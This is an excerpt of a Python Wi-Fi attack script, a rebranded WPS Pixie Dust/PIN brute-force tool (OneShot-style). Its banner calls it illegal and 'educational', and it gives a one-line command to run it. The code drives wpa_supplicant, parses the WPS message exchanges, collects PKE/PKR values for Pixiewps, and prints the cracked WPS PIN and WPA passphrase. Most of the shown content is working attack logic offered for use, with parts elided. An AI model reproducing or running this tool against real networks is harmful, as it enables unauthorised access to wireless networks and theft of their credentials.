...
print('''
     \033[32mooooooooo.    o8o               o8o
      `888   `Y88.  `"'               `"'         
       888   .d88' oooo  oooo    ooo oooo   .ooooo.  
       888ooo88P'  `888   `88b..8P'  `888  d88' `88b 
       888          888     Y888'     888  888ooo888 
       888          888   .o8"'88b    888  888    .o 
      o888o        o888o o88'   888o o888o `Y8bod8P'\033[0m 
                                               
       \033[36mCreated by Ruhul Amin Bokshi  
       GitHub: github.com/ruhul-amin-xxl  \033[0m 
''')

print("\033[35mThis is an illegal tool and made for educational purposes only.\n"
      "Use at your own risk, the owner will not be responsible for any kind of misuse.\033[0m")
print("\033[36mOne line Command:\n\033[32msudo python Wifi_Hack.py -i wlan0 -K\033[0m")
print("\033[36mFor Help Type:\n\033[32mpython Wifi_Hack.py --help\033[0m")
...
class Companion:
    ...
    def __init__(self, interface, save_result=False, print_debug=False):
        ...
        self.sessions_dir = f'{user_home}/.rex/sessions/'
        self.pixiewps_dir = f'{user_home}/.rex/pixiewps/'
    ...
    def __handle_wpas(self, pixiemode=False, verbose=None):
        ...
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                ...
                jalan('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                jalan('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    jalan('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                jalan('[*] Received WSC NACK')
                jalan('\033[31m[-] Error: wrong PIN code\033[0m')
                ...
                if pixiemode:
                    print('\033[36m[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}\033[0m '.format(self.pixie_creds.pke))
            ...
            jalan('[-] wpa_supplicant returned WPS-FAIL')
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            jalan('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                jalan('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                jalan('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            jalan('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            jalan('[*] Received Identity Request')
        elif 'using real identity' in line:
            jalan('[*] Sending Identity Response…')

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        jalan("[*] Running Pixiewps…")
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        jalan(f"\033[32m[-] WPS PIN: '{wps_pin}'\033[0m ")
        jalan(f"\033[32m[+] WPA PSK: '{wpa_psk}'\033[0m ")
        jalan(f"\033[32m[+] AP SSID: '{essid}'\033[0m ")
...
def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, made by ruhul_amin
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(
        description='GitHub: ruhul-amin-xxl',
